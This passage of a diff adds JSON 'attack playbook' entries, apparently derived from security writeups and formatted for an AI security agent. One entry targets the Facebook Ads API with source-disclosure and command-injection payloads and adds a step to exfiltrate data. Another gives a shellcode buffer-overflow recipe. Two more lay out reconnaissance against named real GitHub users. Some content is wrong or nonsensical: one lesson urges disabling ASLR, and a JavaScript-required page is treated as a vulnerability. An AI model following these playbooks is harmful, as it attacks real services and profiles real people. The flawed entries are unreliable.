+          "Step 4: If code execution is achieved, attempt to escalate privileges or exfiltrate sensitive data."
+        ],
+        "payloads_or_patterns": [
+          "Example of a conceptual payload for demonstrating source code disclosure: `?callback=console.log(require('fs').readFileSync('/path/to/source/file.js', 'utf8'))` (Note: Actual exploit requires knowledge of specific API parameters and server-side language/runtime)",
+          "Example of a conceptual RCE payload: `&cmd=ls -la` (Note: Actual exploit requires knowledge of specific API parameters and server-side language/runtime)"
+        ],
+        "tools_recommended": [
+          "Burp Suite: For intercepting, modifying, and replaying HTTP requests to the Facebook Ads API.",
+          "Custom scripts (Python/Bash): To automate fuzzing and payload delivery.",
+          "Payload generation tools: To create specific injection strings."
+        ],
+        "success_indicators": [
+          "Response contains readable source code from the server.",
+          "Execution of a system command on the server is confirmed (e.g., `ls` command output is returned).",
+          "Anomalous behavior such as unexpected data retrieval or modification."
+        ],
+        "failure_indicators": [
+          "API returns a standard error message indicating invalid input or parameters, without revealing source code or executing commands (e.g., 400 Bad Request, specific API error codes). Suggestion: Try different injection vectors or other API endpoints.",
+          "API returns a generic error like 'Internal Server Error' (500) without specific details, which might indicate a WAF or a generic crash rather than controlled execution. Suggestion: Analyze the WAF rules or try less noisy payloads."
+        ]
+      },
+      "impact": "Disclosure of sensitive Facebook Ads API source code, potentially revealing internal logic, security vulnerabilities, or configuration details. In a successful RCE scenario, an attacker could execute arbitrary code on Facebook's servers, leading to data breaches, service disruption, or further compromise.",
+      "key_lesson": "Always validate and sanitize all user-supplied input, especially in API endpoints, to prevent code injection and source code disclosure vulnerabilities.",
+      "id": "0584_facebook_source_code_disclosure_in_ads_a"
+    },
+    {
+      "meta": {
+        "title": "Github Repository on Buffer Overflow Attack",
+        "url": "https://github.com/npapernot/buffer-overflow-attack",
+        "category": "Buffer Overflow Writeups",
+        "vuln_type": "Buffer Overflow",
+        "confidence": 2
+      },
+      "target_profile": {
+        "technology": "Custom C Program",
+        "affected_components": [
+          "stack.c (vulnerable program)"
+        ],
+        "required_access_level": "any_authenticated_user",
+        "tech_stack_fingerprints": [
+          "Custom C code designed to be vulnerable to buffer overflows"
+        ],
+        "attack_surface_type": "source_code"
+      },
+      "trigger_conditions": {
+        "when_to_apply": "When a C program contains a buffer with insufficient bounds checking, and Address Space Layout Randomization (ASLR) is disabled.",
+        "prerequisites": [
+          "Target OS must have ASLR disabled (kernel.randomize_va_space=0)",
+          "Vulnerable C program must be compiled with executable stack enabled (e.g., using 'gcc -z execstack')"
+        ],
+        "applicability_signals": [
+          "The presence of a C program using functions like `strcpy`, `gets`, or `sprintf` without size checks on user-supplied input to fixed-size buffers."
+        ],
+        "skip_if": [
+          "ASLR is enabled on the target system.",
+          "The vulnerable program is compiled with non-executable stack protections."
+        ]
+      },
+      "attack_playbook": {
+        "recon_steps": [
+          "Step 1: Analyze the provided C source code (e.g., stack.c) to identify buffer usage and potential overflow points.",
+          "Step 2: Confirm that ASLR is disabled on the target Ubuntu 12.04 LTS VM by running `sysctl kernel.randomize_va_space` and verifying the output is '0'."
+        ],
+        "attack_steps": [
+          "Step 1: Compile the vulnerable C program (`stack.c`) with the executable stack option: `gcc -z execstack stack.c -o vulnerable_program`",
+          "Step 2: Craft a shellcode payload (e.g., from `call_shellcode.c` or a custom one).",
+          "Step 3: Create an input string that includes the shellcode followed by padding to overflow the buffer and overwrite the return address. The return address should point to the injected shellcode.",
+          "Step 4: Execute the vulnerable program with the crafted input: `./vulnerable_program < crafted_input_string >`"
+        ],
+        "payloads_or_patterns": [
+          "# Example shellcode structure (from call_shellcode.c - simplified)\n# You would need to craft a specific shellcode to execute commands or spawn a shell.\n# The actual payload would be a sequence of bytes representing the shellcode,\n# followed by NOP sled and then the overwritten return address.\n# Example: b'\\x90' * 100 + b'\\xcc\\xcc\\xcc\\xcc' # NOP sled + placeholder for return address"
+        ],
+        "tools_recommended": [
+          "GCC: For compiling C code with specific options like `-z execstack`.",
+          "GDB (GNU Debugger): For debugging the C program, understanding memory layout, and determining the correct return address.",
+          "Python: For scripting the generation of shellcode and overflow payloads."
+        ],
+        "success_indicators": [
+          "The vulnerable program executes the injected shellcode, resulting in a root shell or arbitrary command execution.",
+          "A shell prompt appears unexpectedly after running the vulnerable program with the crafted input."
+        ],
+        "failure_indicators": [
+          "The program crashes with a segmentation fault without executing shellcode, indicating an incorrect return address or payload format.",
+          "The program behaves normally without any shell execution, suggesting the overflow did not occur or the return address was not overwritten correctly. Pivot: Re-evaluate buffer size, shellcode, and return address calculation. Ensure ASLR is off."
+        ]
+      },
+      "impact": "Gaining a root shell on the target system, allowing for arbitrary code execution and full system compromise.",
+      "key_lesson": "Always disable ASLR and compile with non-executable stack protections when running C programs that handle user-supplied input, especially if those programs are not from a trusted source.",
+      "id": "0587_github_repository_on_buffer_overflow_att"
+    },
+    {
+      "meta": {
+        "title": "What is Buffer Overflow: How Attack Works, Examples, Prevention",
+        "url": "https://www.invicti.com/blog/web-security/buffer-overflow-attack/",
+        "category": "Buffer Overflow Writeups",
+        "vuln_type": "Buffer Overflow",
+        "confidence": 1
+      },
+      "target_profile": {
+        "technology": "C, applications written in C",
+        "affected_components": [
+          "Programs that handle direct memory manipulation and lack proper bounds checking."
+        ],
+        "required_access_level": "N/A",
+        "tech_stack_fingerprints": [
+          "Writeup mentions C and direct memory access as the root cause.",
+          "Writeup mentions that even high-level language frameworks can be affected if their underlying components are written in low-level languages."
+        ],
+        "attack_surface_type": "source_code"
+      },
+      "trigger_conditions": {
+        "when_to_apply": "This technique is applicable to applications written in low-level languages like C that perform direct memory operations without proper bounds checking on input data.",
+        "prerequisites": [
+          "The target application must be written in or rely on components written in languages like C that allow direct memory manipulation.",
+          "The application must not adequately validate the size of input data before writing it to a fixed-size buffer."
+        ],
+        "applicability_signals": [
+          "The presence of `memcpy` with a size larger than the destination buffer.",
+          "Code that reads data into a fixed-size buffer without checking if the data size exceeds the buffer capacity."
+        ],
+        "skip_if": [
+          "The target language is purely managed (e.g., Java, Python) and does not expose low-level memory operations.",
+          "All input handling functions include robust size checks before writing to buffers."
+        ]
+      },
+      "attack_playbook": {
+        "recon_steps": [
+          "Analyze source code for C functions like `memcpy`, `strcpy`, `sprintf`, and other string manipulation functions that do not perform bounds checking.",
+          "Identify code sections that read user-controlled input into fixed-size buffers.",
+          "Determine the size of input buffers and compare it against the maximum expected input size."
+        ],
+        "attack_steps": [
+          "Step 1: Craft an input string that exceeds the allocated buffer size by a significant margin.",
+          "Step 2: Submit the oversized input to the vulnerable application via the identified input point (e.g., function parameter, file read).",
+          "Step 3: Observe the application's behavior: look for crashes (segmentation faults), unexpected output, or changes in program flow."
+        ],
+        "payloads_or_patterns": [
+          "A string of characters designed to be larger than the target buffer. Example: A string of 100 'A' characters to overflow a 10-byte buffer."
+        ],
+        "tools_recommended": [
+          "Static analysis tools to identify vulnerable code patterns.",
+          "Debuggers (e.g., GDB) to observe memory state and program execution flow during exploitation.",
+          "Fuzzing tools to automatically generate oversized inputs."
+        ],
+        "success_indicators": [
+          "Application crash (e.g., segmentation fault, unhandled exception).",
+          "Unexpected program behavior or output, indicating overwritten memory.",
+          "In more advanced attacks, successful execution of arbitrary code injected into the overflowed buffer."
+        ],
+        "failure_indicators": [
+          "Application handles oversized input gracefully by truncating or rejecting it.",
+          "A Web Application Firewall (WAF) blocks the oversized input.",
+          "No observable change in application behavior, indicating the buffer is larger than initially assumed or the overflow is not exploitable in the current context."
+        ]
+      },
+      "impact": "Denial of Service (crashing the application), arbitrary code execution leading to full system compromise, or data corruption.",
+      "key_lesson": "Always implement strict bounds checking for all user-controlled input before writing it into fixed-size memory buffers in C-based applications.",
+      "id": "0589_how_buffer_overflow_attacks_work"
+    },
+    {
+      "meta": {
+        "title": "WHAT IS A BUFFER OVERFLOW? LEARN ABOUT BUFFER OVERRUN VULNERABILITIES, EXPLOITS & ATTACKS",
+        "url": "https://www.veracode.com/blog/security-blogs/what-buffer-overflow",
+        "category": "Buffer Overflow Writeups",
+        "vuln_type": "Buffer Overflow",
+        "confidence": 1
+      },
+      "target_profile": {
+        "technology": "insufficient detail in writeup",
+        "affected_components": [
+          "insufficient detail in writeup"
+        ],
+        "required_access_level": "unauthenticated",
+        "tech_stack_fingerprints": [
+          "insufficient detail in writeup"
+        ],
+        "attack_surface_type": "insufficient detail in writeup"
+      },
+      "trigger_conditions": {
+        "when_to_apply": "This playbook is applicable when a target system is known or suspected to be vulnerable to buffer overflows, typically in custom-built applications or older software components where memory management might be less robust. The writeup does not provide specific conditions for applicability.",
+        "prerequisites": [
+          "insufficient detail in writeup"
+        ],
+        "applicability_signals": [
+          "insufficient detail in writeup"
+        ],
+        "skip_if": [
+          "insufficient detail in writeup"
+        ]
+      },
+      "attack_playbook": {
+        "recon_steps": [
+          "The writeup does not provide specific reconnaissance steps for identifying or confirming buffer overflow vulnerabilities. It discusses the theoretical nature of buffer overflows."
+        ],
+        "attack_steps": [
+          "The writeup describes the *concept* of buffer overflows and exploits but does not provide concrete attack steps for an AI security agent to execute against a live target. It details how an attacker overwrites a buffer to gain control or crash a system, but lacks specific instructions for payload creation or delivery."
+        ],
+        "payloads_or_patterns": [
+          "The writeup does not provide specific payloads or patterns that can be directly used by an agent. It discusses the *idea* of crafting malicious input that exceeds buffer capacity."
+        ],
+        "tools_recommended": [
+          "The writeup does not recommend specific tools for executing buffer overflow attacks."
+        ],
+        "success_indicators": [
+          "The writeup describes success indicators conceptually (e.g., arbitrary code execution, system crash) but does not provide specific, observable indicators for an agent to detect (e.g., specific HTTP response codes, error messages, or process behavior changes)."
+        ],
+        "failure_indicators": [
+          "The writeup does not describe specific failure indicators for buffer overflow attempts."
+        ]
+      },
+      "impact": "The writeup explains that buffer overflows can lead to arbitrary code execution, denial of service, or system compromise, but does not detail specific impacts for a given target.",
+      "key_lesson": "Buffer overflows exploit vulnerabilities in how applications handle input that exceeds allocated memory buffers; manual analysis and fuzzing are often required to identify and exploit them, as this writeup provides theoretical background but no actionable playbooks.",
+      "id": "0591_what_is_a_buffer_overflow_learn_about_bu"
+    },
+    {
+      "meta": {
+        "title": "0xAsm0d3us",
+        "url": "https://x.com",
+        "category": "Contributing",
+        "vuln_type": "JavaScript Disabled Error",
+        "confidence": 1
+      },
+      "target_profile": {
+        "technology": "x.com (Twitter)",
+        "affected_components": [
+          "Core website functionality when JavaScript is disabled"
+        ],
+        "required_access_level": "unauthenticated",
+        "tech_stack_fingerprints": [
+          "HTML string: 'JavaScript is not available. We\u2019ve detected that JavaScript is disabled in this browser.'"
+        ],
+        "attack_surface_type": "web_app"
+      },
+      "trigger_conditions": {
+        "when_to_apply": "This technique is applicable when the target website explicitly informs the user that JavaScript is required and presents an error page instead of the main content when JavaScript is disabled.",
+        "prerequisites": [
+          "The target website must be configured to require JavaScript for core functionality."
+        ],
+        "applicability_signals": [
+          "Observing the specific HTML error message: 'JavaScript is not available. We\u2019ve detected that JavaScript is disabled in this browser.'"
+        ],
+        "skip_if": [
+          "The website functions correctly without JavaScript enabled, or the error message indicates a different issue (e.g., browser compatibility).",
+          "No specific error message related to JavaScript being disabled is observed."
+        ]
+      },
+      "attack_playbook": {
+        "recon_steps": [
+          "Step 1: Attempt to access x.com with JavaScript disabled in the browser.",
+          "Step 2: Observe the response for any error messages or specific pages indicating JavaScript is required."
+        ],
+        "attack_steps": [
+          "Step 1: Configure a browser to disable JavaScript.",
+          "Step 2: Navigate to <TARGET_URL> (e.g., https://x.com).",
+          "Step 3: Analyze the displayed content for specific error messages related to JavaScript."
+        ],
+        "payloads_or_patterns": [
+          "N/A"
+        ],
+        "tools_recommended": [
+          "Browser Developer Tools: To disable JavaScript for testing (e.g., Chrome DevTools -> Settings -> Preferences -> disable JavaScript)."
+        ],
+        "success_indicators": [
+          "The specific HTML string 'JavaScript is not available. We\u2019ve detected that JavaScript is disabled in this browser. Please enable JavaScript or switch to a supported browser to continue using x.com.' is present in the response.",
+          "The user is presented with an error page and cannot access the main website functionality."
+        ],
+        "failure_indicators": [
+          "The website loads and functions normally despite JavaScript being disabled, indicating it's not a strict requirement or not implemented as expected. In this case, this specific \"vulnerability\" is not present.",
+          "A different error message is displayed, requiring further investigation into that specific error."
+        ]
+      },
+      "impact": "Users who intentionally disable JavaScript (e.g., for privacy or security reasons) are unable to use the platform, leading to a degraded user experience and potential loss of access to services. For automated agents, this means the target is not accessible without JavaScript, which might be a security consideration depending on the agent's capabilities.",
+      "key_lesson": "Test web applications with JavaScript disabled to identify functionalities that are strictly dependent on it, which could indicate potential usability or security flaws.",
+      "id": "0593_0xasm0d3us"
+    },
+    {
+      "meta": {
+        "title": "devanshbatham",
+        "url": "https://github.com/devanshbatham",
+        "category": "Maintainers",
+        "vuln_type": "N/A",
+        "confidence": 1
+      },
+      "target_profile": {
+        "technology": "GitHub",
+        "affected_components": [
+          "user profile page",
+          "repositories"
+        ],
+        "required_access_level": "unauthenticated",
+        "tech_stack_fingerprints": [
+          "X-Frame-Options: SAMEORIGIN",
+          "X-Content-Type-Options: nosniff",
+          "X-XSS-Protection: 1; mode=block",
+          "Strict-Transport-Security: max-age=31536000; includeSubDomains",
+          "Referrer-Policy: strict-origin-when-cross-origin",
+          "Content-Security-Policy: default-src 'none'",
+          "X-GitHub-Request-ID",
+          "/assets/images/modules/icons/actions.svg",
+          "window.github.com",
+          "__Host-",
+          "logged_in_user"
+        ],
+        "attack_surface_type": "web_app"
+      },
+      "trigger_conditions": {
+        "when_to_apply": "This playbook is applicable when analyzing a GitHub user profile and their associated repositories, particularly when looking for potential vulnerabilities in the tools or projects they maintain. It's a general reconnaissance and analysis playbook for GitHub profiles.",
+        "prerequisites": [
+          "Access to a GitHub profile page."
+        ],
+        "applicability_signals": [
+          "Target is a GitHub profile URL (e.g., https://github.com/username)."
+        ],
+        "skip_if": [
+          "The target is not a GitHub profile or repository."
+        ]
+      },
+      "attack_playbook": {
+        "recon_steps": [
+          "Step 1: Navigate to the GitHub user profile of the target (e.g., https://github.com/<TARGET_USERNAME>). Observe the user's pinned repositories, contributions, and any listed social media links or personal websites.",
+          "Step 2: For each pinned and actively maintained repository, navigate to its GitHub page. Examine the README, the 'Security' tab (if available), and recent commit history for any security-related information or potential vulnerabilities mentioned.",
+          "Step 3: Visit any personal websites or blogs listed on the profile. Look for blog posts related to security research, bug bounty findings, or discussions about tools and techniques."
+        ],
+        "attack_steps": [
+          "Step 1: Analyze the code of any security-related tools or libraries maintained by the user (e.g., from pinned repositories). Look for common vulnerabilities like XSS, SQLi, insecure deserialization, or logic flaws.",
+          "Step 2: If the user has listed achievements or credits for bug bounty programs, investigate the reported vulnerabilities for patterns or common misconfigurations that might be present in their own projects or other projects they contribute to.",
+          "Step 3: Review the 'Security Advisories' section for any of the user's repositories. If advisories exist, analyze their nature and see if similar issues could be present in other parts of their work."
+        ],
+        "payloads_or_patterns": [
+          "N/A (This is a manual analysis playbook, not payload-driven)"
+        ],
+        "tools_recommended": [
+          "Burp Suite: To proxy traffic and inspect requests/responses when interacting with the target's website or linked applications.",
+          "GitHub's search functionality: To find specific keywords or patterns across repositories.",
+          "Static analysis tools (e.g., SonarQube, Bandit): To scan repository code for common security flaws."
+        ],
+        "success_indicators": [
+          "Discovery of a security vulnerability within a tool or project maintained by the user.",
+          "Identification of a pattern in reported vulnerabilities that suggests a recurring mistake.",
+          "Finding publicly disclosed security advisories that could be replicated or indicate a larger systemic issue."
+        ],
+        "failure_indicators": [
+          "No obvious security flaws found in the user's public projects or profile. This indicates a need to broaden the scope of analysis or move to different attack vectors.",
+          "User's projects are minimal or have no public code. This suggests that direct code analysis is not feasible."
+        ]
+      },
+      "impact": "Discovering vulnerabilities in tools or projects maintained by security researchers or maintainers can lead to broader impact if those tools are widely used. It can also reveal patterns of insecure coding practices that could be exploited in other contexts.",
+      "key_lesson": "Always analyze the security posture of security researchers and maintainers themselves, as their projects or tools might contain exploitable vulnerabilities, or their publicly disclosed findings can reveal patterns for future exploitation.",
+      "id": "0594_devanshbatham"
+    },
+    {
+      "meta": {
+        "title": "e13v3n-0xb",
+        "url": "https://github.com/e13v3n-0xb",
+        "category": "Maintainers",
+        "vuln_type": "Insufficient Detail",
+        "confidence": 1
+      },
+      "target_profile": {
+        "technology": "GitHub",
+        "affected_components": [
+          "User Profile"
+        ],
+        "required_access_level": "unauthenticated",
+        "tech_stack_fingerprints": [
+          "github.com"
+        ],
+        "attack_surface_type": "web_app"
+      },
+      "trigger_conditions": {
+        "when_to_apply": "When reviewing a GitHub user's profile page and attempting to find actionable security insights.",
+        "prerequisites": [],
+        "applicability_signals": [
+          "Access to a GitHub user profile page."
+        ],
+        "skip_if": [
+          "No specific conditions noted for skipping, but the writeup itself lacks actionable exploit details."
+        ]
+      },
+      "attack_playbook": {
+        "recon_steps": [
+          "Step 1: Navigate to the GitHub user profile page of the target user (e.g., https://github.com/<USER_ID>)."
+        ],
+        "attack_steps": [
+          "Step 1: Examine the user's pinned repositories and general profile information."
+        ],
+        "payloads_or_patterns": [],
+        "tools_recommended": [],
+        "success_indicators": [
+          "Insufficient detail in writeup."
+        ],
+        "failure_indicators": [
+          "Insufficient detail in writeup."
+        ]
+      },
+      "impact": "Insufficient detail in writeup.",
+      "key_lesson": "Insufficient detail in writeup. A writeup requires concrete steps, payloads, and success/failure indicators to be useful for an AI agent.",
+      "id": "0595_e13v3n_0xb"
+    }
+  ]
+}
